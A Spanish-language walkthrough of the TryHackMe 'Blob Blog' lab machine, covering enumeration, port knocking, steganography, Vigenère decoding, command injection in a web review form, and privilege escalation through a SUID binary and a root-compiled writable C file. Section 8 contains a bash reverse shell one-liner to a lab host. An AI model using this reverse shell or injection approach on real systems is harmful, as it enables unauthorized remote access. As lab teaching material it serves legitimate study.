<p align="center">
  <img width="621" height="150" alt="Screenshot 2026-09-22 155347" src="https://github.com/user-attachments/assets/9047bbba-f9df-4199-8ee7-87a0d0da8d8e" />
</p>

# Blob Blog — CTF Writeup

> **Platform:** TryHackMe  
> **Difficulty:** Fácil  
> **OS:** Linux  
> **Machine:** Blob Blog  
> **IP:** `10.67.183.58`

## 📝 Summary

En esta máquina la ruta de compromiso empieza con una enumeración de puertos y servicios. El servidor web del puerto 80 escondía información codificada que llevaba a descubrir un mecanismo de **port knocking**. Después de abrir nuevos puertos, la enumeración permitió conseguir credenciales para FTP y, mediante esteganografía y cifrado Vigenère, obtener las credenciales de Bob.

Con esas credenciales fue posible acceder a una aplicación web en el puerto 8080 que permitía ejecutar comandos. Desde ahí obtuve una shell como `www-data`. Para escalar a un usuario encontré un binario SUID poco habitual, `blogFeeback`, cuyo comportamiento pude analizar con Ghidra. Finalmente, `pspy64` permitió identificar un proceso ejecutado periódicamente como root que compilaba un archivo C escribible por Bob. Modificando ese archivo se consiguió la escalada final a root.

---

## 🔎 1. Reconocimiento

### Nmap

Comencé con un escaneo completo de puertos:

```bash
nmap -sS -p- --min-rate=5000 -Pn -n 10.67.183.58 -oG portus
```

- `-sS`: SYN scan.
- `-p-`: escanea los 65535 puertos.
- `--min-rate=5000`: establece una tasa mínima de paquetes.
- `-Pn`: asume que el host está activo.
- `-n`: evita resolución DNS.
- `-oG portus`: guarda la salida en formato grepable.
<img width="560" height="187" alt="Screenshot 2026-09-22 160037" src="https://github.com/user-attachments/assets/274de5b5-9e0f-4439-9c50-731454c8a6a5" />



Inicialmente encontré:
- **22/tcp — SSH**
- **80/tcp — HTTP**


SSH no era especialmente útil todavía porque no tenía credenciales.

---

## 🌐 2. Enumeración del puerto 80

La página inicial no mostraba nada evidente, así que revisé el código fuente.



Encontré un bloque codificado. Después de decodificarlo aparecía una pista relacionada con **"knock"** y tres números.



<img width="823" height="506" alt="Screenshot 2026-09-22 160337" src="https://github.com/user-attachments/assets/e5f296d3-9d8c-4df1-9463-0b3bee62e347" />



Esto apuntaba a un mecanismo de **port knocking**.

### Port Knocking

La idea era enviar la secuencia indicada para provocar la apertura de servicios que no aparecían en el primer escaneo.

```bash
knock 10.67.183.58 {puertos, separados por espacio}
```

![Port knocking](https://github.com/user-attachments/assets/407191e1-68b5-4b86-a5dd-176b2ce25bab)

Después del knocking volví a escanear la máquina y aparecieron nuevos servicios.


<img width="770" height="340" alt="Screenshot 2026-09-22 161701" src="https://github.com/user-attachments/assets/229de7f9-df51-4b9b-a8ab-c4cfaf62294c" />



---

## 📁 3. FTP y búsqueda de credenciales

Uno de los nuevos servicios era FTP. El acceso anónimo estaba deshabilitado, así que continué con la enumeración del puerto 80 y de los nuevos servicios.

La información encontrada permitió identificar al usuario **Bob** y obtener una contraseña codificada que posteriormente pude recuperar.

![Credenciales](https://github.com/user-attachments/assets/112be328-6dc9-40a6-89ff-bf414c40a5e9)

Con las credenciales obtenidas pude acceder al FTP.


<img width="540" height="225" alt="Screenshot 2026-09-22 162908" src="https://github.com/user-attachments/assets/9fc4409e-a441-4f4c-8b43-acbcac13e04c" />



---

## 🕵️ 4. Esteganografía

Entre los archivos disponibles encontré una imagen que podía contener información oculta.

Al analizarla con `steghide`, la herramienta solicitó una contraseña, por lo que continué enumerando los servicios para encontrarla.

```bash
steghide extract -sf cool.jpeg
```

<img width="302" height="82" alt="Screenshot 2026-09-22 163734" src="https://github.com/user-attachments/assets/ce02cf67-0d61-4652-9544-5f63abab6d6b" />

La información extraída tenía apariencia de texto cifrado y también incluía una pista relacionada con un directorio.

---

## 🔐 5. Vigenère y Bob's Drawer

El puerto **445** también requería atención: en esta máquina no correspondía a SMB, sino a HTTP.

Utilicé `dirsearch` para continuar la enumeración:

```bash
dirsearch -u 10.67.183.58:445 -e * -r
```

La enumeración reveló una ruta interesante y, revisando su contenido, encontré otra contraseña.

<img width="862" height="117" alt="Screenshot 2026-09-22 163906" src="https://github.com/user-attachments/assets/60971308-c218-4f89-87ba-06bc0078795e" />

Con la información obtenida pude continuar con la imagen y llegar a **Bob's drawer**.

![Bob's drawer](https://github.com/user-attachments/assets/b2e1fa02-3ee8-4173-acb9-2f8dc57ab169)

El resultado tenía apariencia de un texto cifrado con **Vigenère**. Utilicé el dato obtenido como clave para descifrarlo.

![Vigenère](https://github.com/user-attachments/assets/4a57c94c-5e8e-4bcf-b923-ef5c6c3080a4)

El resultado fueron las credenciales de Bob.

---



![Reverse shell](https://github.com/user-attachments/assets/c70a6a83-25db-435d-b99b-655d17c90eab)




## 💻 6. Aplicación web — Puerto 8080

El puerto **8080** mostraba otra aplicación HTTP basada en Apache.

Para enumerar sus rutas utilicé:

```bash
python3 /opt/dirsearch/dirsearch.py -u 10.67.183.58:8080 -e * -r
```

Las rutas encontradas redirigían a un login. Las credenciales de Bob funcionaron.

<img width="680" height="222" alt="Screenshot 2026-09-22 164519" src="https://github.com/user-attachments/assets/beb721a5-ef6a-470f-a7f0-8bf46184cf32" />


Después de iniciar sesión encontré una página de review con un campo de entrada.

---

## 💉 7. Command Injection

Probé comandos básicos en el campo de entrada. Por ejemplo:

```bash
ls
```

La salida del comando aparecía reflejada en la página, confirmando que la aplicación estaba ejecutando comandos.

<img width="856" height="102" alt="Screenshot 2026-09-22 164654" src="https://github.com/user-attachments/assets/5d2fd52a-7108-4923-806b-8b5ef8306c73" />

---

## 🐚 8. Acceso inicial — Reverse Shell

Con la ejecución de comandos confirmada, utilicé una reverse shell dentro del laboratorio:

```bash
bash -i >& /dev/tcp/10.9.1.161/4444 0>&1
```

Esto permitió obtener una shell como **www-data**.

<img width="627" height="116" alt="Screenshot 2026-09-22 171604" src="https://github.com/user-attachments/assets/259f0465-e408-41e1-99b8-f18b59ef317d" />

Después mejoré la terminal:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

Luego:

```text
Ctrl+Z
stty raw -echo
fg
fg
export TERM=xterm-256color
```


---

## ⬆️ 9. Escalada a usuario

Como `www-data`, comprobé primero los privilegios mediante:

```bash
sudo -l
```

No encontré privilegios útiles, así que continué con una enumeración de binarios SUID:

```bash
find / -perm -4000 2>/dev/null
```

Entre los resultados apareció un binario poco habitual llamado:

```text
blogFeeback
```

### Análisis con Ghidra

Para entender el comportamiento del binario lo transferí a mi máquina y lo analicé con **Ghidra**.

El análisis mostró un bucle de 1 a 7 que comparaba `7 - iteration` con los argumentos recibidos. Además, `iVar1` avanzaba sobre los argumentos, indicando que el programa esperaba varios parámetros en un orden concreto.

![Ghidra](https://github.com/user-attachments/assets/196b3dcb-ee8a-4fe0-a9d7-fdae456f5b33)

La secuencia correcta permitió obtener acceso como el usuario de la máquina.

---

## 👑 10. Escalada a root

Después de obtener acceso como usuario observé un comportamiento extraño: aparecía periódicamente un mensaje en la terminal.

La crontab normal no explicaba este comportamiento, así que utilicé **pspy64** para observar procesos ejecutados en segundo plano.

```bash
chmod +x pspy64
./pspy64
```

![pspy64](https://github.com/user-attachments/assets/ac98c82c-ac8f-418c-af62-79e814e31e40)

pspy reveló un proceso muy interesante:

```text
/bin/sh -c gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring && chmod +x /home/bobloblaw/Documents/.also_boring/.still_boring && /home/bobloblaw/Documents/.also_boring/.still_boring | tee /dev/pts/0 /dev/pts/1 /dev/pts/2 && rm /home/bobloblaw/.also_boring/.still_boring
```


La cadena hacía varias cosas:

1. Compilaba `.boring_file.c`.
2. Generaba un ejecutable.
3. Le daba permisos de ejecución.
4. Ejecutaba el binario.
5. Eliminaba el archivo generado.

Lo importante era que el proceso se ejecutaba con privilegios de **root** y el archivo C podía ser modificado por el usuario.

El archivo vulnerable era:

```text
/home/bobloblaw/Documents/.boring_file.c
```

Al modificar ese archivo y esperar a su siguiente ejecución programada, conseguí ejecutar código dentro del contexto privilegiado del proceso y obtener acceso como **root**.

---

## 🏁 11. Flags

### User Flag

El acceso al usuario se consiguió después de analizar el binario SUID `blogFeeback` y determinar los argumentos que esperaba.

### Root Flag

La escalada final se consiguió aprovechando el archivo C escribible que era compilado y ejecutado periódicamente por un proceso con privilegios de root.

---

## 🧠 What I Learned

- No asumir que un puerto concreto necesariamente ejecuta el servicio esperado.
- Revisar siempre el código fuente de las aplicaciones web.
- La información codificada puede contener pistas importantes.
- El **port knocking** puede ocultar servicios que no aparecen en el primer escaneo.
- Las imágenes pueden contener información mediante esteganografía.
- Un texto extraído puede necesitar una segunda etapa de descifrado, como Vigenère.
- Un binario SUID desconocido merece ser investigado.
- Ghidra permite entender la lógica de un binario cuando no tenemos su código fuente.
- `pspy` ayuda a descubrir procesos programados que no aparecen claramente en la crontab.
- Un archivo modificable que posteriormente es compilado y ejecutado por root puede convertirse en una vía de escalada.

## 🛠️ Tools Used

- Nmap
- Knock
- Dirsearch
- FTP
- Steghide
- CyberChef
- Cryptii
- Ghidra
- pspy64
- Python
- Bash
